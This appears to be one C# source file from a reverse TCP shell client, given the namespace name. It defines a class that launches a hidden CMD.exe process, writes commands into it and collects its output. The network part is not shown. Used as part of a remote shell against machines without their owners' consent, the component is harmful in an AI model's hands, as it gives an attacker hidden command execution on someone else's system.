using System.Collections.Generic;
using System.Diagnostics;

namespace ReverseTCPClient
{
    class CommandLine
    {
        //Variable containg data output by the current process line by line.
        static object outputLock = new object();
        private string outputRecieved = "";
        private Process CommandInterface = new Process();

        /// <summary>
        /// Sets up a Process object, defualting as CMD, and begins its execution.
        /// </summary>
        /// <param name="filename">The windows service to be run.</param>
        public CommandLine(string filename = "CMD.exe")
        {
            //Setting up Process to be run.
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.CreateNoWindow = true;
            startInfo.FileName = filename;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            CommandInterface.StartInfo = startInfo;
            //Setting up event listeners to output data to global variable when received. 
            CommandInterface.OutputDataReceived += dataReceieved;
            CommandInterface.ErrorDataReceived += dataReceieved;
            CommandInterface.Start();
            //Beginning event listeners
            CommandInterface.BeginOutputReadLine();
            CommandInterface.BeginErrorReadLine();
        }

        /// <summary>
        /// Event handler for receiving data from the commandline.
        /// </summary>
        /// <param name="sender">Sender object.</param>
        /// <param name="line">arguments for the event.</param>
        void dataReceieved(object sender, DataReceivedEventArgs line)
        {
            lock (outputLock)
            {
                outputRecieved += (line.Data + "\n");
            }
        }

        /// <summary>
        /// Runs a given command in the application that is running.
        /// </summary>
        /// <param name="command">Command to be run</param>
        public void runCommand(string command)
        {
            CommandInterface.StandardInput.WriteLine(command);
        }

        /// <summary>
        /// Kills the running process. Can not be restarted. 
        /// </summary>
        public void killCommandLine(string commandToClose = "exit")
        {
            runCommand(commandToClose);
            CommandInterface.WaitForExit();
            CommandInterface.CancelOutputRead();
            CommandInterface.CancelErrorRead();
        }

        /// <summary>
        /// Safely returns data from the Commandline.
        /// </summary>
        /// <returns>String containing all data received so far.</returns>
        public string dataReturned()
        {
            string output = "";
            lock (outputLock)
            {
                output = outputRecieved;
                outputRecieved = "";
            }

            return output;
        }
    }
}
